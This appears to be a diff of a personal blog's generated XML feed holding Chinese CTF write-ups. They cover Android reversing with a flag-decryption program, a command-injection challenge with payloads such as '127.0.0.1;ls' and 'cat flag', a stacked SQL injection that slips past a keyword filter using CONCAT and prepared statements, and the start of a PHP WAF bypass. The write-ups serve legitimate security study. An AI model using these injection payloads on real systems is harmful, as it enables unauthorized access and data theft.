class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((a[i] &lt; <span class="string">&#x27;A&#x27;</span> || a[i] &gt; <span class="string">&#x27;Z&#x27;</span>) &amp;&amp; (a[i] &lt; <span class="string">&#x27;a&#x27;</span> || a[i] &gt; <span class="string">&#x27;z&#x27;</span>)) &#123;</span><br><span class="line">                        x[i] = a[i];</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        x[i] = (<span class="type">char</span>) (a[i] - <span class="string">&#x27;\b&#x27;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (String.valueOf(x).equals(edit.getText().toString())) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>; i2 &lt; <span class="number">38</span>; i2++) &#123;</span><br><span class="line">                        <span class="keyword">if</span> ((b[i2] &lt; <span class="string">&#x27;A&#x27;</span> || b[i2] &gt; <span class="string">&#x27;Z&#x27;</span>) &amp;&amp; (b[i2] &lt; <span class="string">&#x27;a&#x27;</span> || b[i2] &gt; <span class="string">&#x27;z&#x27;</span>)) &#123;</span><br><span class="line">                            y[i2] = b[i2];</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            y[i2] = (<span class="type">char</span>) (b[i2] + <span class="number">16</span>);</span><br><span class="line">                            <span class="keyword">if</span> ((y[i2] &gt; <span class="string">&#x27;Z&#x27;</span> &amp;&amp; y[i2] &lt; <span class="string">&#x27;a&#x27;</span>) || y[i2] &gt;= <span class="string">&#x27;z&#x27;</span>) &#123;</span><br><span class="line">                                y[i2] = (<span class="type">char</span>) (y[i2] - <span class="number">26</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    text.setText(String.valueOf(y));</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                text.setText(<span class="string">&quot;答案错了肿么办。。。不给你又不好意思。。。哎呀好纠结啊~~~&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onOptionsItemSelected</span><span class="params">(MenuItem item)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (item.getItemId() == R.id.action_settings) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.onOptionsItemSelected(item);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>好在<code>Java</code>的语法和<code>C/C++</code>类似,
-可以大概看出来是个啥意思:</p>
-<p>先对<code>a</code>数组进行处理, 放到<code>x</code>数组中,
-对比用户的输入和<code>x</code>数组是否相同,
-若相同则对<code>b</code>数组进行处理放到<code>y</code>数组中并显示出来,
-想必<code>y</code>数组中的就是<strong>flag</strong>.</p>
-<p>解密代码如下:</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> a[] = &#123; <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;e&#x27;</span> &#125;;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> b[] = &#123; <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span> &#125;;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> x[<span class="number">64</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> y[<span class="number">64</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">17</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> ((a[i] &lt; <span class="string">&#x27;I&#x27;</span> &amp;&amp; a[i] &gt;= <span class="string">&#x27;A&#x27;</span>) || (a[i] &lt; <span class="string">&#x27;i&#x27;</span> &amp;&amp; a[i] &gt;= <span class="string">&#x27;a&#x27;</span>)) &#123;</span><br><span class="line">			x[i] = (a[i] + <span class="number">18</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ((a[i] &lt; <span class="string">&#x27;A&#x27;</span> || a[i] &gt; <span class="string">&#x27;Z&#x27;</span>) &amp;&amp; (a[i] &lt; <span class="string">&#x27;a&#x27;</span> || a[i] &gt; <span class="string">&#x27;z&#x27;</span>)) &#123;</span><br><span class="line">			x[i] = a[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			x[i] = (a[i] - <span class="string">&#x27;\b&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i2 = <span class="number">0</span>; i2 &lt; <span class="number">38</span>; i2++) &#123;</span><br><span class="line">		<span class="keyword">if</span> ((b[i2] &lt; <span class="string">&#x27;A&#x27;</span> || b[i2] &gt; <span class="string">&#x27;Z&#x27;</span>) &amp;&amp; (b[i2] &lt; <span class="string">&#x27;a&#x27;</span> || b[i2] &gt; <span class="string">&#x27;z&#x27;</span>)) &#123;</span><br><span class="line">			y[i2] = b[i2];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			y[i2] = (b[i2] + <span class="number">16</span>);</span><br><span class="line">			<span class="keyword">if</span> ((y[i2] &gt; <span class="string">&#x27;Z&#x27;</span> &amp;&amp; y[i2] &lt; <span class="string">&#x27;a&#x27;</span>) || y[i2] &gt;= <span class="string">&#x27;z&#x27;</span>) &#123;</span><br><span class="line">				y[i2] = (y[i2] - <span class="number">26</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Key:%s\nFlag:%s&quot;</span>, x, y);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Key:LzakAkLzwXdsyZgew</span></span><br><span class="line"><span class="comment">//Flag:flag&#123;c164675262033b4c49bdf7f9cda28a75&#125;</span></span><br><span class="line"><span class="comment">//用unsigned char是因为实测用char的话, 这个flag的算法在C/C++里会出现溢出而出现乱码, </span></span><br><span class="line"><span class="comment">//查了一下是因为Java的char是2字节. 这个flag的算法其实就是位移+16位类凯撒加密</span></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Reverse</category>
-      </categories>
-      <tags>
-        <tag>逆向</tag>
-        <tag>Java逆向</tag>
-        <tag>Android逆向</tag>
       </tags>
   </entry>
   <entry>
@@ -1081,53 +1081,6 @@ alt="image-20211109164631082" />
       </tags>
   </entry>
   <entry>
-    <title>[ACTF2020 新生赛]Exec 1</title>
-    <url>/2021/10/30/%5BWeb%5DACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec-1/</url>
-    <content><![CDATA[<p>首先查看源代码,一无所获,尝试输入<code>127.0.0.1</code>, 有回显</p>
-<figure>
-<img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301304951.png"
-alt="image-20211030130427904" />
-<figcaption aria-hidden="true">image-20211030130427904</figcaption>
-</figure>
-<p>接着尝试组合命令<code>127.0.0.1&amp;&amp;ls</code>,失败</p>
-<p>再尝试<code>127.0.0.1;ls</code>成功(实测这里也可以用<code>127.0.0.1||ls</code>,
-但是用分号最稳妥, 不管前面的语句是否执行成功后面的语句都会执行)<img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301303157.png"
-alt="image-20211030130359106" /></p>
-<p><code>127.0.0.1||ls&amp;&amp;cat index.php</code>输出<code>index.php</code>的源代码,
-由于输出在网页上会自动解析成网页, 所以需要右键查看源代码才能看到<img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301311590.png"
-alt="image-20211030131153532" /></p>
-<p>可见后台内容十分简单没有任何审查,
-尝试构造payload到根目录寻找<strong>flag</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">target=127.0.0.1;cd ../../../../../;ls -la;</span><br></pre></td></tr></table></figure>
-<figure>
-<img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301315276.png"
-alt="image-20211030131524211" />
-<figcaption aria-hidden="true">image-20211030131524211</figcaption>
-</figure>
-<p>可以看到根目录下有一个<strong>flag</strong>文件,
-我们只需要将它打印出来即可,将payload改为</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">target=127.0.0.1;cd ../../../../../;ls -la;cat flag;</span><br></pre></td></tr></table></figure>
-<figure>
-<img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301317663.png"
-alt="image-20211030131706602" />
-<figcaption aria-hidden="true">image-20211030131706602</figcaption>
-</figure>
-<p><strong>flag</strong>到手~</p>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>Web安全</tag>
-        <tag>PHP</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>[ACTF2020 新生赛]Upload 1</title>
     <url>/2021/11/01/%5BWeb%5DACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload-1/</url>
     <content><![CDATA[<p>进去就是个灯泡, 鼠标移到灯泡上出现文件选择框</p>
@@ -1274,6 +1227,53 @@ alt="image-20211031123455770" />
       </tags>
   </entry>
   <entry>
+    <title>[ACTF2020 新生赛]Exec 1</title>
+    <url>/2021/10/30/%5BWeb%5DACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec-1/</url>
+    <content><![CDATA[<p>首先查看源代码,一无所获,尝试输入<code>127.0.0.1</code>, 有回显</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301304951.png"
+alt="image-20211030130427904" />
+<figcaption aria-hidden="true">image-20211030130427904</figcaption>
+</figure>
+<p>接着尝试组合命令<code>127.0.0.1&amp;&amp;ls</code>,失败</p>
+<p>再尝试<code>127.0.0.1;ls</code>成功(实测这里也可以用<code>127.0.0.1||ls</code>,
+但是用分号最稳妥, 不管前面的语句是否执行成功后面的语句都会执行)<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301303157.png"
+alt="image-20211030130359106" /></p>
+<p><code>127.0.0.1||ls&amp;&amp;cat index.php</code>输出<code>index.php</code>的源代码,
+由于输出在网页上会自动解析成网页, 所以需要右键查看源代码才能看到<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301311590.png"
+alt="image-20211030131153532" /></p>
+<p>可见后台内容十分简单没有任何审查,
+尝试构造payload到根目录寻找<strong>flag</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">target=127.0.0.1;cd ../../../../../;ls -la;</span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301315276.png"
+alt="image-20211030131524211" />
+<figcaption aria-hidden="true">image-20211030131524211</figcaption>
+</figure>
+<p>可以看到根目录下有一个<strong>flag</strong>文件,
+我们只需要将它打印出来即可,将payload改为</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">target=127.0.0.1;cd ../../../../../;ls -la;cat flag;</span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301317663.png"
+alt="image-20211030131706602" />
+<figcaption aria-hidden="true">image-20211030131706602</figcaption>
+</figure>
+<p><strong>flag</strong>到手~</p>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>PHP</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>PHP的__wakeup()函数漏洞</title>
     <url>/2023/04/06/%5BWeb%5DPHP%E7%9A%84__wakeup()%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<p><code>unserialize()</code> 反序列化产生一个对象时,
@@ -1344,91 +1344,78 @@ alt="image-20230407001903508" />
       </tags>
   </entry>
   <entry>
-    <title>[RoarCTF 2019]Easy Calc 1</title>
-    <url>/2021/11/01/%5BWeb%5DRoarCTF-2019-Easy-Calc-1/</url>
-    <content><![CDATA[<p>进来就是一个普通的计算器, 输入表达式给出结果,先看一波源代码</p>
+    <title>[强网杯 2019]随便注 1</title>
+    <url>/2021/10/29/%5BWeb%5D%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8-1/</url>
+    <content><![CDATA[<p>查看源代码未找到有用信息, 尝试提交数字1, 返回一个数组,
+接着尝试注入<code>1' or 1;%23</code>, 成功返回三个数组,但未找到flag.</p>
+<p><img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202110291646793.png"
+alt="image-20211029164617724" /><img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202110291647411.png"
+alt="image-20211029164706347" /></p>
+<p>尝试堆叠注入</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1;show tables;%23</span></span><br></pre></td></tr></table></figure>
+<p>查出表名,可以看到<code>words</code>和<code>1919810931114514</code>两个表</p>
 <figure>
 <img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202111011924048.png"
-alt="image-20211101192427994" />
-<figcaption aria-hidden="true">image-20211101192427994</figcaption>
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202110291651805.png"
+alt="image-20211029165116741" />
+<figcaption aria-hidden="true">image-20211029165116741</figcaption>
 </figure>
+<p>堆叠注入</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1;show tables;desc `1919810931114514`;desc `words`;%23</span></span><br></pre></td></tr></table></figure>
+<p>查出两个表的字段.</p>
+<p>观察到<code>words</code>表有两个字段<code>id</code>和<code>data</code>,
+<code>1919810931114514</code>仅有一个字段<code>flag</code>,
+猜测<strong>flag</strong>就在表<code>1919810931114514</code>中.</p>
 <figure>
 <img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202111011925244.png"
-alt="image-20211101192502182" />
-<figcaption aria-hidden="true">image-20211101192502182</figcaption>
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202110291701074.png"
+alt="image-20211029170144998" />
+<figcaption aria-hidden="true">image-20211029170144998</figcaption>
 </figure>
-<p>被设了WAF, 咱也不知道是防的啥, 接着看.
-请求参数被发往<code>calc.php</code>, 我们直接访问一下看看:</p>
+<p>尝试注入</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1;select * from `1919810931114514`;%23</span></span><br></pre></td></tr></table></figure>
+<p>提示</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/select|update|delete|drop|insert|where|\./i&quot;</span>,<span class="variable">$inject</span>);, </span><br></pre></td></tr></table></figure>
+<p>得知有关键字审查</p>
 <figure>
 <img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202111011926659.png"
-alt="image-20211101192659620" />
-<figcaption aria-hidden="true">image-20211101192659620</figcaption>
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202110292207097.png"
+alt="image-20211029220716039" />
+<figcaption aria-hidden="true">image-20211029220716039</figcaption>
 </figure>
-<p>源码直接显示出来了, 可以看到有很多过滤, 很多字符都被列入了黑名单.
-先看看能不能得到当前的文件绝对路径</p>
+<p>采用<strong>预编译</strong>的方式绕过关键字审查, 构造注入语句:</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;set @sql = CONCAT(&#x27;</span>se<span class="string">&#x27;,&#x27;</span>lect <span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;<span class="string">&#x27;);prepare stmt from @sql;EXECUTE stmt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#拆开为</span></span><br><span class="line"><span class="string">1&#x27;</span>; #闭合单引号</span><br><span class="line"><span class="keyword">set</span> <span class="variable">@sql</span> <span class="operator">=</span> CONCAT(<span class="string">&#x27;se&#x27;</span>,<span class="string">&#x27;lect * from `1919810931114514`;&#x27;</span>); #定义变量,采用CONCAT()拼接字符串绕过审查</span><br><span class="line"><span class="keyword">prepare</span> stmt <span class="keyword">from</span> <span class="variable">@sql</span>; #预编译<span class="keyword">SQL</span>语句</span><br><span class="line"><span class="keyword">EXECUTE</span> stmt; #执行编译完的<span class="keyword">SQL</span>语句</span><br></pre></td></tr></table></figure>
 <figure>
 <img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202111011938789.png"
-alt="image-20211101193809717" />
-<figcaption aria-hidden="true">image-20211101193809717</figcaption>
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202110292236737.png"
+alt="image-20211029223621684" />
+<figcaption aria-hidden="true">image-20211029223621684</figcaption>
 </figure>
-<p>网页直接<code>Forbidden</code>了, 经过测试,
-只要<code>num</code>的参数里含除数字以外的字符就会如此,
-这应该就是之前说的WAF了, 不绕过这个WAF后面的操作都无法进行下去.
-但是要绕过这个漏洞,
-首先要知道php在解析提交的参数名和其对应的值时都做了什么</p>
+<p>提示</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">strstr</span>(<span class="variable">$inject</span>, <span class="string">&quot;set&quot;</span>) &amp;&amp; <span class="title function_ invoke__">strstr</span>(<span class="variable">$inject</span>, <span class="string">&quot;prepare&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>有第二道关键字审查, 由于strstr区分大小写, 而set和prepare大小写不敏感,
+故更改注入语句为</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;Set @sql = CONCAT(&#x27;</span>se<span class="string">&#x27;,&#x27;</span>lect <span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;<span class="string">&#x27;);Prepare stmt from @sql;EXECUTE stmt;</span></span><br></pre></td></tr></table></figure>
+<p>即可绕过审查, 拿到flag</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202110292237890.png"
+alt="image-20211029223717822" />
+<figcaption aria-hidden="true">image-20211029223717822</figcaption>
+</figure>
 <blockquote>
-<p>PHP需要将所有参数名转换为有效键名(比如在$_REQUEST变量里的关联数组里,
-有所有提交的参数名和值)</p>
-<p>所以<code>php</code>至少会干两件事</p>
-<p>1.删除某些字符</p>
-<p>2.将某些字符转换为下划线<code>_</code></p>
+<p>源代码</p>
 </blockquote>
-<p>以下为一些本地测试结果:</p>
-<blockquote>
-<ol type="1">
-<li>位于提交的参数前面的<code>[空格]</code>、<code>%20</code>或<code>+</code>会被删除,
-比如提交<code>param=1&amp;  param2=2(或param=1&amp;++param2=2)</code> ,
-最终在<code>$_REQUEST</code>里是<code>("param1"=&gt;"1","param2"=&gt;"2")</code></li>
-<li>位于提交的参数前面的<code>.</code>会被替换成<code>_</code> ,
-提交<code>param=1&amp;..param2=2</code>,
-最终在<code>$_REQUEST</code>里是<code>("param1"=&gt;"1","__param2"=&gt;"2")</code></li>
-<li>位于参数名中间、末尾，无论是<code>[空格]</code>、<code>+</code>、<code>%20</code>还是<code>.</code>都会被替换成<code>_</code></li>
-</ol>
-</blockquote>
-<p>这个WAF我们可以采用在num前面加个空格方式绕过, 构造payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">calc.php? num=var_dump(scandir(chr(47))) </span><br><span class="line">//本题calc.php?%20num=var_dump(scandir(chr(47)))亦可</span><br></pre></td></tr></table></figure>
-<p><code>scandir()</code>可以列出根目录下的文件,
-但是<code>/</code>被过滤了,
-所以用<code>chr()</code>函数,采用<code>ASCII</code>码的方式绕过</p>
-<figure>
-<img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012021640.png"
-alt="image-20211101202126567" />
-<figcaption aria-hidden="true">image-20211101202126567</figcaption>
-</figure>
-<p>根目录下有个<code>f1agg</code>,
-想必就是我们要找的<strong>flag</strong>了.</p>
-<p>故技重施, 用<code>chr()</code>函数拼出路径,
-再用<code>file_get_contents()</code>(也可以用<code>highlight_file()</code>)获取里面的内容,
-payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">calc.php? num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure>
-<figure>
-<img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012031550.png"
-alt="image-20211101203110483" />
-<figcaption aria-hidden="true">image-20211101203110483</figcaption>
-</figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf1</span>(<span class="params"><span class="variable">$inject</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/select|update|delete|drop|insert|where|\./i&quot;</span>,<span class="variable">$inject</span>) &amp;&amp; <span class="keyword">die</span>(<span class="string">&#x27;return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf2</span>(<span class="params"><span class="variable">$inject</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">strstr</span>(<span class="variable">$inject</span>, <span class="string">&quot;set&quot;</span>) &amp;&amp; <span class="title function_ invoke__">strstr</span>(<span class="variable">$inject</span>, <span class="string">&quot;prepare&quot;</span>) &amp;&amp; <span class="keyword">die</span>(<span class="string">&#x27;strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;)&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;inject&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;inject&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">waf1</span>(<span class="variable">$id</span>);</span><br><span class="line">    <span class="title function_ invoke__">waf2</span>(<span class="variable">$id</span>);</span><br><span class="line">    <span class="variable">$mysqli</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;supersqli&quot;</span>);</span><br><span class="line">    <span class="comment">//多条sql语句</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from `words` where id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">multi_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$res</span>)&#123;<span class="comment">//使用multi_query()执行一条或多条sql语句</span></span><br><span class="line">      <span class="keyword">do</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$rs</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">store_result</span>())&#123;<span class="comment">//store_result()方法获取第一条sql语句查询结果</span></span><br><span class="line">          <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$rs</span>-&gt;<span class="title function_ invoke__">fetch_row</span>())&#123;</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$row</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="variable">$rs</span>-&gt;<span class="title function_ invoke__">Close</span>(); <span class="comment">//关闭结果集</span></span><br><span class="line">          <span class="keyword">if</span> (<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">more_results</span>())&#123;  <span class="comment">//判断是否还有更多结果集</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;<span class="keyword">while</span>(<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">next_result</span>()); <span class="comment">//next_result()方法获取下一结果集，返回bool值</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;error &quot;</span>.<span class="variable">$mysqli</span>-&gt;errno.<span class="string">&quot; : &quot;</span>.<span class="variable">$mysqli</span>-&gt;error;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">close</span>();  <span class="comment">//关闭数据库连接</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>Web</category>
       </categories>
       <tags>
         <tag>Web安全</tag>
-        <tag>PHP</tag>
+        <tag>SQL注入</tag>
       </tags>
   </entry>
   <entry>
@@ -1460,8 +1447,8 @@ alt="image-20211101203110483" />
 此时的<code>__init__</code>没有<code>__globals__</code>属性.</p>
 <blockquote>
 <p>未重载的<code>__init__</code>:
-<code>&lt;slot wrapper '__init__' of 'object' objects&gt;</code>
-重载过的<code>__init__</code>:
+<code>&lt;slot wrapper '__init__' of 'object' objects&gt;</code></p>
+<p>重载过的<code>__init__</code>:
 <code>&lt;function A.__init__ at 0x00000257D3B0D1F0&gt;</code></p>
 </blockquote></li>
 <li><p><code>__import__</code>:
@@ -1779,78 +1766,91 @@ Session 上传进度 - Manual</a></li>
       </tags>
   </entry>
   <entry>
-    <title>[强网杯 2019]随便注 1</title>
-    <url>/2021/10/29/%5BWeb%5D%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8-1/</url>
-    <content><![CDATA[<p>查看源代码未找到有用信息, 尝试提交数字1, 返回一个数组,
-接着尝试注入<code>1' or 1;%23</code>, 成功返回三个数组,但未找到flag.</p>
-<p><img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202110291646793.png"
-alt="image-20211029164617724" /><img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202110291647411.png"
-alt="image-20211029164706347" /></p>
-<p>尝试堆叠注入</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1;show tables;%23</span></span><br></pre></td></tr></table></figure>
-<p>查出表名,可以看到<code>words</code>和<code>1919810931114514</code>两个表</p>
+    <title>[RoarCTF 2019]Easy Calc 1</title>
+    <url>/2021/11/01/%5BWeb%5DRoarCTF-2019-Easy-Calc-1/</url>
+    <content><![CDATA[<p>进来就是一个普通的计算器, 输入表达式给出结果,先看一波源代码</p>
 <figure>
 <img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202110291651805.png"
